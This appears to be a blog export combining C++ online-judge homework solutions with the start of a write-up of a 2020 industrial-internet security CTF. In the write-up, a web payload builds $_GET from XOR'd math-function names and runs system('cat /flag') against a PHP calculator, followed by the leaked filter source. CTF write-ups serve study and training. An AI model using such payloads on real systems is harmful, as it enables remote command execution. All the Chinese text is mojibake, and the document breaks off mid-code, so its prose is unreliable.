        for(int i=0;i&lt;n;i++)&#123;
            int x;
            cin &gt;&gt; x;
            a[i]=x;
        &#125;
    &#125;
    int operator[](int x)&#123;return a[x];&#125;
&#125;;
//////////////////////////////////////////
int main()
&#123;
    int cases;
    Array arr;
    cin &gt;&gt; cases;
    for(int ca = 1; ca &lt;= cases; ca++)
    &#123;
        int len;
        cin &gt;&gt; len;
        arr.get(len);
        for(int i = 0; i &lt; arr.size(); i++)
            if(i + 1 == arr.size())
                cout &lt;&lt; arr[i];
            else
                cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;;
        cout &lt;&lt; endl;
    &#125;
&#125;
</code></pre>
<h3 id="45-æ•°ç»„ç±»ï¼ˆIIï¼‰"><a href="#45-æ•°ç»„ç±»ï¼ˆIIï¼‰" class="headerlink" title="45.æ•°ç»„ç±»ï¼ˆIIï¼‰"></a>45.æ•°ç»„ç±»ï¼ˆIIï¼‰</h3><blockquote>
<h2 id="Description-44"><a href="#Description-44" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ¨¡æ¿æ•°ç»„ç±»ï¼Œç”¨äºå­˜å‚¨æ•°ç»„å’Œå¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. Array::Array(int l)æ„é€ æ–¹æ³•ï¼šåˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸ºlçš„ç»„å¯¹è±¡ã€‚</p>
<p>\2. Array::size()æ–¹æ³•ï¼šè¿”å›Arrayå¯¹è±¡ä¸­å…ƒç´ ä¸ªæ•°ã€‚</p>
<p>\3. Array::put(int n)æ–¹æ³•ï¼šæŒ‰ä»å¤§åˆ°å°çš„é¡ºåºè¾“å‡ºå‰nå¤§å…ƒç´ ï¼Œè‹¥æ•°ç»„é•¿åº¦å°äºnåˆ™ä»å¤§åˆ°å°è¾“å‡ºå…¨éƒ¨å…ƒç´ ã€‚</p>
<p>\4. ä¸‹æ ‡è¿ç®—ç¬¦ï¼šè¿”å›ä¸‹æ ‡æ‰€æŒ‡çš„å…ƒç´ ã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ¨¡æ¿æ•°ç»„ç±»Arrayï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<h2 id="Input-44"><a href="#Input-44" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ã€‚</p>
<p>åé¢çš„æ¯è¡Œä»¥ä¸€ä¸ªæ•´æ•°kå¼€å¤´ï¼Œè¡¨ç¤ºåé¢æœ‰kä¸ªåŒç±»å‹çš„æ•°ç»„å…ƒç´ ã€‚</p>
<p>æ•°ç»„å…ƒç´ æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼šæ•´æ•°ã€æµ®ç‚¹æ•°å’Œå­—ç¬¦ï¼Œå¹¶ä¸”æŒ‰å›ºå®šçš„æ¬¡åºé—´éš”å‡ºç°ã€‚</p>
<h2 id="Output-44"><a href="#Output-44" class="headerlink" title="Output"></a>Output</h2><p>æŠŠè¾“å…¥çš„æ•°ç»„ï¼ŒæŒ‰å€¼ä»å¤§åˆ°å°è¾“å‡ºå‰10ä¸ªå…ƒç´ ï¼Œè‹¥è¾“å…¥ä¸è¶³10ä¸ªåˆ™å…¨éƒ¨è¾“å‡ºã€‚æ¯è¡Œæ•°æ®å¯¹åº”ä¸€ä¸ªè¾“å‡ºã€‚æ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-44"><a href="#Sample-Input-44" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>310 1 2 3 4 5 6 7 8 9 05 1.1 2.2 3.3 4.4 5.520 ABCDEGHIJMNPRSTUVWXY</p>
<h2 id="Sample-Output-44"><a href="#Sample-Output-44" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>9 8 7 6 5 4 3 2 1 05.5 4.4 3.3 2.2 1.1Y X W V U T S R P N</p>
<h2 id="HINT-44"><a href="#HINT-44" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-44"><a href="#Append-Code-44" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1573&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include&lt;iostream&gt;  
using namespace std;  
template&lt;class T&gt;  
class Array  
&#123;  
private:  
    T *sss;  
    int si;  
public:  
    Array(int l):si(l)&#123;sss=new T[si];&#125;  
    ~Array()&#123;if (sss!=NULL)delete []sss;&#125;  
    int size()&#123;return si;&#125;  
    void put(int n)  
    &#123;  
        int i,j;  
        for(i=0;i&lt;si-1;i++)//æŒ¨ç€å’Œæ¯ä¸ªæ¯”ï¼Œæœ€åä¸€ä¸ªä¸ç”¨äº†  
        &#123;  
            for(j=i+1;j&lt;si;j++)//ä»ä¸‹ä¸€ä¸ªå¼€å§‹ï¼Œåˆ°æœ€å  
            &#123;  
                if(sss[i]&lt;sss[j])  
                &#123;  
                    T t=sss[i];  
                    sss[i]=sss[j];  
                    sss[j]=t;  
                &#125;  
            &#125;  
        &#125;  
        if(n&gt;si)  
        n=si;  
            cout&lt;&lt;sss[0];  
        for(int i=1;i&lt;n;i++)  
            cout&lt;&lt;&quot; &quot;&lt;&lt;sss[i];  
        cout&lt;&lt;endl;  
    &#125;  
    T&amp; operator[](int n)//å°‘ä¸ªå¼•ç”¨ï¼Œæˆ‘å»  
    &#123;  
        return sss[n];  
    &#125;  
&#125;; 
//////////////////////////////////////////
int main()
&#123;
    int cases, len;
    cin &gt;&gt; cases;
    for(int ca = 1; ca &lt;= cases; ca++)
    &#123;
        cin &gt;&gt; len;
        if(ca % 3 == 0)
        &#123;
            Array&lt;char&gt; chr_arr(len);
            for(int i = 0; i &lt; chr_arr.size(); i++)
                cin &gt;&gt; chr_arr[i];
            chr_arr.put(10);
        &#125;
        if(ca % 3 == 1)
        &#123;
            Array&lt;int&gt; int_arr(len);
            for(int i = 0; i &lt; int_arr.size(); i++)
                cin &gt;&gt; int_arr[i];
            int_arr.put(10);
        &#125;
        if(ca % 3 == 2)
        &#123;
            Array&lt;double&gt; dbl_arr(len);
            for(int i = 0; i &lt; dbl_arr.size(); i++)
                cin &gt;&gt; dbl_arr[i];
            dbl_arr.put(10);
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="46-Problem-E-å†œå¤«æœå›­"><a href="#46-Problem-E-å†œå¤«æœå›­" class="headerlink" title="46.Problem E: å†œå¤«æœå›­"></a>46.Problem E: å†œå¤«æœå›­</h3><blockquote>
<h2 id="Description-45"><a href="#Description-45" class="headerlink" title="Description"></a>Description</h2><p>ç§‹å¤©åˆ°äº†ï¼Œæœå›­é‡Œçš„æ°´æœæˆç†Ÿäº†ï¼Œå•†è´©ä»¬æ¥æ”¶æ°´æœäº†ï¼Œå†œå¤«ä»¬éƒ½å¸Œæœ›è‡ªå·±çš„æ°´æœèƒ½å–ä¸ªå¥½ä»·é’±ã€‚</p>
<p>ç°åœ¨æœå›­é‡Œæœ‰ä¸‰ç§æ°´æœæ­£åœ¨é”€å”®ï¼Œè‹¹æœï¼ˆAppleï¼‰ã€é¦™è•‰ï¼ˆBananaï¼‰ã€æ¢¨ï¼ˆPearï¼‰ã€‚æ¯æ¬¡é”€å”®éƒ½ä¼šè®°å½•ä¸‹æ°´æœçš„ç§ç±»ã€å•ä»·å’Œæ€»é‡ï¼Œinput()å‡½æ•°å¯ä»¥è¯»å–æ¯æ¡é”€å”®è®°å½•çš„å•ä»·å’Œæ€»é‡ï¼Œtotal()å‡½æ•°å¯ä»¥è®¡ç®—å‡ºè¿™æ¬¡é”€å”®çš„æ€»ä»·ã€‚</p>
<p>ä½†æ˜¯ï¼Œé”€å”®å‘˜åœ¨è®°å½•æ—¶å¿™ä¸­å‡ºé”™ï¼Œå„ä¸­æ°´æœçš„å•ä»·å’Œæ€»é‡çš„å•ä½æ²¡æœ‰ç»Ÿä¸€ã€‚å•ä»·æ˜¯æ¯å…¬æ–¤çš„ä»·æ ¼ï¼Œè€Œæ°´æœæ˜¯æŒ‰ç®±è®°å½•çš„ã€‚å…¶ä¸­ï¼Œè‹¹æœä¸€ç®±æŒ‰30å…¬æ–¤è®¡ç®—ï¼Œé¦™è•‰ä¸€ç®±æŒ‰25å…¬æ–¤è®¡ç®—ï¼Œæ¢¨ä¸€ç®±æŒ‰20å…¬æ–¤è®¡ç®—ã€‚æ¯ç§æ°´æœæ¯æ¬¡é”€å”®çš„æ€»ä»·æ˜¯â€œå•ä»·<em>æ€»é‡</em>æ¯ç®±å…¬æ–¤æ•°â€ã€‚</p>
<p>ç°åœ¨ï¼Œä½ æ¥è®¾è®¡ä¸€ä¸ªç¨‹åºå¸®å¿™è®¡ç®—æœå›­å–å‡ºæ°´æœçš„æ€»ä»·ã€‚ç”±äºtotal()å‡½æ•°å¯¹æ¯ç§æ°´æœçš„è®¡ç®—æ–¹å¼éƒ½ä¸ä¸€æ ·ï¼Œå› æ­¤ä½¿ç”¨å¤šæ€æ¥å®ç°ã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡å¹¶å®ç°è¿™ä¸ªæ°´æœç±»çš„æ´¾ç”Ÿä½“ç³»ï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿè¿è¡Œå¹¶å¾—åˆ°æ­£ç¡®çš„è¾“å‡ºã€‚è°ƒç”¨æ ¼å¼è§append.cc</p>
<h2 id="Input-45"><a href="#Input-45" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºåé¢æœ‰næ¡æ°´æœæ”¶è´­çš„è®°å½•ã€‚æ¯æ¡è®°å½•åˆ†ä¸º3éƒ¨åˆ†ï¼Œæ°´æœç§ç±»ã€å•ä»·å’Œæ€»é‡ã€‚</p>
<h2 id="Output-45"><a href="#Output-45" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸ºä¸€è¡Œï¼Œè¡¨ç¤ºæ•´ä¸ªæœå›­å–å‡ºæ°´æœçš„æ€»ä»·ã€‚</p>
<h2 id="Sample-Input-45"><a href="#Sample-Input-45" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>5Apple 4.2 100Banana 8.8 50Apple 4.5 200Banana 7.8 100Pear 3.7 100</p>
<h2 id="Sample-Output-45"><a href="#Sample-Output-45" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Total Price : 77500</p>
<h2 id="HINT-45"><a href="#HINT-45" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-45"><a href="#Append-Code-45" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=0&pid=1670&getkey=">append.c</a>, <a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1670&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include&lt;iostream&gt;
using namespace std;
class Fruit&#123;
public:
    string name;
    double per;
    int n;
    Fruit()&#123;&#125;
    Fruit(string n):name(n)&#123;&#125;
    void input()&#123;cin&gt;&gt;per&gt;&gt;n;&#125;
    virtual double total()=0;
&#125;;
class Apple:public Fruit&#123;
public:
    string name;
    ///double per;
    ///int n;
    Apple():name(&quot;Apple&quot;)&#123;&#125;
    double total()&#123;return per*n*30;&#125;
&#125;;
class Banana:public Fruit&#123;
public:
    string name;
    ///double per;
    ///int n;
    Banana():name(&quot;Banana&quot;)&#123;&#125;
    double total()&#123;return per*n*25;&#125;
&#125;;
class Pear:public Fruit&#123;
public:
    string name;
    ///double per;
    ///int n;
    Pear():name(&quot;Pear&quot;)&#123;&#125;
    double total()&#123;return per*n*20;&#125;
&#125;;
int main()
&#123;
    Fruit* fruit;
    string fruit_name;
    double sum = 0.0;
    int cases;
    cin &gt;&gt; cases;
    for(int i = 1; i &lt;= cases; i++)
    &#123;
        cin &gt;&gt; fruit_name;
        if(fruit_name == &quot;Apple&quot;)
            fruit = new Apple();
        if(fruit_name == &quot;Banana&quot;)
            fruit = new Banana();
        if(fruit_name == &quot;Pear&quot;)
            fruit = new Pear();
        fruit-&gt;input();
        sum += fruit-&gt;total();
        delete fruit;
    &#125;
    cout &lt;&lt; &quot;Total Price : &quot; &lt;&lt; sum &lt;&lt; endl;

     return 0;
&#125;</code></pre>
<h3 id="47-ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç±»"><a href="#47-ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç±»" class="headerlink" title="47.ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç±»"></a>47.ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç±»</h3><blockquote>
<h2 id="Description-46"><a href="#Description-46" class="headerlink" title="Description"></a>Description</h2><p>å®šä¹‰ä¸€ä¸ªè¡¨ç¤ºä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹çš„ç±»Equationï¼Œè¯¥ç±»è‡³å°‘å…·æœ‰ä»¥ä¸‹3ä¸ªæ•°æ®æˆå‘˜ï¼šaã€bå’Œcï¼Œç”¨äºè¡¨ç¤ºæ–¹ç¨‹â€œa<em>x</em>x + b*x +c = 0â€ã€‚åŒæ—¶ï¼Œè¯¥ç±»è¿˜è‡³å°‘å…·æœ‰ä»¥ä¸‹ä¸¤ä¸ªæˆå‘˜å‡½æ•°ï¼š</p>
<p>\1. void solve()ï¼šç”¨äºæ±‚æ–¹ç¨‹çš„æ ¹ã€‚</p>
<p>\2. void printRoot()ï¼šç”¨äºè¾“å‡ºæ–¹ç¨‹çš„æ ¹ã€‚</p>
<p>è®¾å®šï¼š</p>
<p>\1. æ‰€æœ‰è¾“å…¥çš„aã€bã€cæ‰€ç”Ÿæˆçš„æ–¹ç¨‹å¿…å®šæœ‰ä¸ª2ä¸ªä¸åŒçš„å®æ ¹ã€‚</p>
<p>\2. è¾“å‡ºçš„ä¸¤ä¸ªæ ¹æŒ‰ç…§ä»å¤§åˆ°å°çš„é¡ºåºè¾“å‡ºï¼Œä¸¤ä¸ªæ ¹ä¹‹é—´ç”¨ä¸€ä¸ªç©ºæ ¼éš”å¼€ï¼Œè€Œä¸”æ¯ä¸ªæ ¹å¿…é¡»ä¸”ä»…èƒ½ä¿ç•™2ä½å°æ•°ï¼Œå³ä½¿å°æ•°éƒ¨åˆ†ä¸º0ã€‚</p>
<p>\3. è¯·æ ¹æ®æ ·ä¾‹å’Œç»™å‡ºçš„main()å‡½æ•°å®šä¹‰ç›¸åº”çš„æ„é€ å‡½æ•°ã€‚</p>
<h2 id="Input-46"><a href="#Input-46" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥æœ‰è‹¥å¹²è¡Œï¼Œæ¯è¡Œæœ‰3ä¸ªå®æ•°ï¼Œåˆ†åˆ«ä¸ºæ–¹ç¨‹â€œa<em>x</em>x + b*x + c = 0â€ä¸­çš„ç³»æ•°aã€bã€cã€‚</p>
<h2 id="Output-46"><a href="#Output-46" class="headerlink" title="Output"></a>Output</h2><p>æŒ‰ç…§é¢˜ç›®è¦æ±‚ä¸­çš„è®¾å®šæ¡ä»¶2è¾“å‡ºæ–¹ç¨‹çš„æ ¹ã€‚</p>
<h2 id="Sample-Input-46"><a href="#Sample-Input-46" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1 3 2</p>
<h2 id="Sample-Output-46"><a href="#Sample-Output-46" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>-1.00 -2.00</p>
<h2 id="HINT-46"><a href="#HINT-46" class="headerlink" title="HINT"></a>HINT</h2><p>å¯ä»¥ä½¿ç”¨fixedå’Œsetprecision()æ¥å®ç°è¾“å‡ºå›ºå®šå°æ•°ä½æ•°çš„æ•°å€¼ã€‚</p>
<h2 id="Append-Code-46"><a href="#Append-Code-46" class="headerlink" title="Append Code"></a>Append Code</h2><p>[append.cc](./Problem B_ ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç±»_files/Source Code.html),</p>
</blockquote>
<pre><code>
#include &lt;iostream&gt;
#include &lt;iomanip&gt;
#include &lt;math.h&gt;
using namespace std;
class Equation
&#123;
private :
    double a,b,c,x1,x2;
   public:
     Equation(double x,double y,double z)
     &#123;
         a = x;b = y; c = z;
     &#125;
     void solve ()
     &#123;

         x1 = (-b+sqrt(b*b-4*a*c))/(2*a);
         x2 = (-b-sqrt(b*b-4*a*c))/(2*a);
     &#125;
    void printRoot()
    &#123;
       //cout.precision(3);
       cout&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(2)&lt;&lt;x1&lt;&lt;&quot; &quot;&lt;&lt;x2&lt;&lt;endl;
    &#125;
&#125;;</code></pre>
<blockquote>
<pre><code>setiosflags(ios::fixed)æ˜¯ç”¨å®šç‚¹æ–¹å¼è¡¨ç¤ºå®æ•°ã€‚ 
ä½¿ç”¨setprecision(n)å¯æ§åˆ¶è¾“å‡ºæµæ˜¾ç¤ºæµ®ç‚¹æ•°çš„æ•°å­—ä¸ªæ•°ã€‚C++é»˜è®¤çš„æµè¾“å‡ºæ•°å€¼æœ‰æ•ˆä½æ˜¯6ã€‚
å¦‚æœsetprecision(n)ä¸setiosflags(ios::fixed)åˆç”¨ï¼Œå¯ä»¥æ§åˆ¶å°æ•°ç‚¹å³è¾¹çš„æ•°å­—ä¸ªæ•°ã€‚</code></pre>
</blockquote>
<h3 id="48-å­—ç¬¦ç±»çš„å°è£…"><a href="#48-å­—ç¬¦ç±»çš„å°è£…" class="headerlink" title="48.å­—ç¬¦ç±»çš„å°è£…"></a>48.å­—ç¬¦ç±»çš„å°è£…</h3><blockquote>
<h2 id="Description-47"><a href="#Description-47" class="headerlink" title="Description"></a>Description</h2><p>å…ˆæ¥ä¸ªç®€å•ä¹ é¢˜ï¼Œç»ƒç»ƒæ‰‹å§ï¼ç°åœ¨éœ€è¦ä½ æ¥ç¼–å†™ä¸€ä¸ªCharacterç±»ï¼Œå°†charè¿™ä¸€åŸºæœ¬æ•°æ®ç±»å‹è¿›è¡Œå°è£…ã€‚è¯¥ç±»ä¸­éœ€è¦æœ‰å¦‚ä¸‹æˆå‘˜å‡½æ•°ï¼š</p>
<p>\1. æ— å‚æ„é€ å‡½æ•°ã€‚</p>
<p>\2. æ„é€ å‡½æ•°Character(char)ï¼šç”¨å‚æ•°åˆå§‹åŒ–æ•°æ®æˆå‘˜ã€‚</p>
<p>\3. void setCharacter(char)ï¼šé‡æ–°è®¾ç½®å­—ç¬¦å€¼ã€‚</p>
<p>\4. int getAsciiCode()ï¼šè¿”å›å­—ç¬¦çš„ASIIç ã€‚</p>
<p>\5. char getCharacter()ï¼šè¿”å›å­—ç¬¦å€¼ã€‚</p>
<p>\6. ææ„å‡½æ•°ã€‚</p>
<h2 id="Input-47"><a href="#Input-47" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥åªæœ‰1è¡Œï¼ŒåŒ…å«ä¸€ä¸ªåˆæ³•çš„ã€å¯æ‰“å°çš„å­—ç¬¦ã€‚</p>
<h2 id="Output-47"><a href="#Output-47" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºæœ‰å¥½å¤šè¡Œï¼Œè¯·å‚è€ƒæ ·ä¾‹æ¥ç¼–å†™ç›¸åº”çš„å‡½æ•°ã€‚</p>
<h2 id="Sample-Input-47"><a href="#Sample-Input-47" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>c</p>
<h2 id="Sample-Output-47"><a href="#Sample-Output-47" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Default constructor is called!Character a is created!ch1 is c and its ASCII code is 99.ch2 is a and its ASCII code is 97.Character a is erased!Character c is erased!</p>
<h2 id="HINT-47"><a href="#HINT-47" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-47"><a href="#Append-Code-47" class="headerlink" title="Append Code"></a>Append Code</h2><p>[append.cc](./Problem D_ å­—ç¬¦ç±»çš„å°è£…_files/Source Code.html),</p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Character&#123;
public:
    char c;
    Character()&#123;cout &lt;&lt; &quot;Default constructor is called!&quot; &lt;&lt; endl;&#125;
    Character(char cc):c(cc)&#123;cout &lt;&lt; &quot;Character &quot; &lt;&lt; c &lt;&lt; &quot; is created!&quot; &lt;&lt; endl;&#125;
    void setCharacter(char cc)&#123;c=cc;&#125;
    int getAsciiCode()&#123;return (int)c;&#125;
    char getCharacter()&#123;return c;&#125;
    ~Character()&#123;cout &lt;&lt; &quot;Character &quot; &lt;&lt; c &lt;&lt; &quot; is erased!&quot; &lt;&lt; endl;&#125;
&#125;;
///////////////////
int main()
&#123;
    char ch;
    Character ch1, ch2(&#39;a&#39;);
    cin&gt;&gt;ch;
    ch1.setCharacter(ch);
    cout&lt;&lt;&quot;ch1 is &quot;&lt;&lt;ch1.getCharacter()&lt;&lt;&quot; and its ASCII code is &quot;&lt;&lt;ch1.getAsciiCode()&lt;&lt;&quot;.&quot;&lt;&lt;endl;
    cout&lt;&lt;&quot;ch2 is &quot;&lt;&lt;ch2.getCharacter()&lt;&lt;&quot; and its ASCII code is &quot;&lt;&lt;ch2.getAsciiCode()&lt;&lt;&quot;.&quot;&lt;&lt;endl;
    return 0;
&#125;
</code></pre>
<blockquote>
<p>33/42</p>
</blockquote>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>other</tag>
      </tags>
  </entry>
  <entry>
    <title>2020å·¥ä¸šäº’è”ç½‘å®‰å…¨å­¦ç”Ÿç»„åˆèµ›WP</title>
    <url>/2020/10/25/2020-gong-ye-hu-lian-wang-an-quan-xue-sheng-zu-chu-sai-wp/</url>
    <content><![CDATA[<blockquote>
<p>Webé¢˜AKäº†å¯æ˜¯æ²¡æœ‰äºŒè¿›åˆ¶é€‰æ‰‹ï¼Œè“ç˜¦å•ŠQAQ</p>
</blockquote>
<blockquote>
<p> æ¯”èµ›é¢˜ç›®éƒ½å­˜äº†ä¸€ä»½æ‰“åŒ…ä¸Šä¼ äº†ï¼Œé“¾æ¥å¦‚ä¸‹ï¼š</p>
<p>é“¾æ¥: <a href="https://pan.baidu.com/s/14Eo7f5AnAVzM5k8sn9e_JQ" target="_blank" rel="noopener">https://pan.baidu.com/s/14Eo7f5AnAVzM5k8sn9e_JQ</a>  å¯†ç : mi5q</p>
</blockquote>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="æ–°å‹è®¡ç®—å™¨"><a href="#æ–°å‹è®¡ç®—å™¨" class="headerlink" title="æ–°å‹è®¡ç®—å™¨"></a>æ–°å‹è®¡ç®—å™¨</h3><p>é¢˜ç›®å°±åªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼ŒæŒ‰ç…§é¡µé¢æç¤ºæ˜¯ä¸ªæ•°å­¦è®¡ç®—çš„åŠŸèƒ½ï¼Œæ”¯æŒPHPä¸­çš„æ•°å­¦å‡½æ•°å’Œä¸‰è§’å‡½æ•°ï¼Œé‚£ä¹ˆæ€è·¯åº”è¯¥å°±æ˜¯åˆ©ç”¨æ•°å­¦å‡½æ•°æˆ–è€…å¼‚æˆ–ç­‰æ¥æ‹¼æ¥å‡ºæƒ³è¦çš„å†…å®¹æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>é¢˜ç›®ç±»ä¼¼å›½èµ›çš„Love Mathï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•è¿‡æ»¤äº†æŒºå¤šçš„å‡½æ•°çš„ï¼Œè¿˜æ˜¯æœ‰äº›å·®åˆ«ã€‚</p>
<p>ç»è¿‡æµ‹è¯•ä¸‰è§’å‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œé‚£ä¹ˆæ–¹å‘å°±æ˜¯ï¼šè°ƒç”¨æ•°å­¦å‡½æ•°é€æ­¥æ‹¼å‡‘å‡º<code>$_GET/$_POST</code>æˆ–è€…é€šè¿‡å¼‚æˆ–å¾—åˆ°<code>$__GET/$_POST</code></p>
<p>è¿™é‡Œè¢«bançš„å‡½æ•°æœ‰ç‚¹å¤šï¼Œbase_convertå’Œdechexéƒ½è¢«banæ‰äº†ï¼Œé‚£ä¹ˆé€šè¿‡å¼‚æˆ–æ¥æ‹¼å‡‘ã€‚</p>
<p>payloadï¼š</p>
<pre><code>http://eci-2zefjdda0snqnakjsw9m.cloudeci1.ichunqiu.com/flag.php?search=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></pre><p>flag:</p>
<pre><code>flag{11cda751-7e87-49da-8006-e2fd23c5fe49}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/1.jpg" alt=""></p>
<p>PSï¼šè¯»åˆ°çš„flag.phpçš„æºç </p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">{</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string">"string:"</span><span class="token punctuation">.</span><span class="token string">"00000000000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string">"string:"</span><span class="token punctuation">.</span><span class="token string">"111111111111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token operator">*</span><span class="token operator">/</span> <span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Smarty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string">"1+1"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* if(filter($ip)) { $smarty->display("string:"."00000000000"); die("0000000000000000"); } */</span> <span class="token comment" spellcheck="true">//$your_ip = $smarty->display("string:".$ip); echo "</span>
è®¡ç®—ç»“æœ <span class="token punctuation">:</span> <span class="token string">"; if (strlen($content) >= 80) { die("</span>ä½ çš„è¾“å…¥ä¹Ÿå¤ªé•¿äº†å§<span class="token operator">=</span> <span class="token operator">=</span><span class="token string">"); } $specialchars = [' ', '\t', '\r', '\n','\'', '"</span><span class="token string">', '</span>`<span class="token string">']; foreach ($specialchars as $cc) { if (preg_match('</span><span class="token operator">/</span><span class="token string">' . $cc . '</span><span class="token operator">/</span>m<span class="token string">', $content)) { die("æƒ³å•¥å‘¢= =è¾“è¿™ç§å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"); } } $whitelist = [ '</span>is_finite<span class="token string">','</span>deg2rad<span class="token string">', '</span>mt_getrandmax<span class="token string">','</span>is_infinite<span class="token string">','</span>log10<span class="token string">' ]; $whitelist1=['</span>pi<span class="token string">', '</span>pow<span class="token string">', '</span>rad2deg<span class="token string">', '</span>rand<span class="token string">', '</span>round<span class="token string">', '</span>sin<span class="token string">', '</span>sinh<span class="token string">', '</span>sqrt<span class="token string">', '</span>srand<span class="token string">', '</span>cos<span class="token string">', '</span>cosh<span class="token string">', '</span>decbin<span class="token string">' , 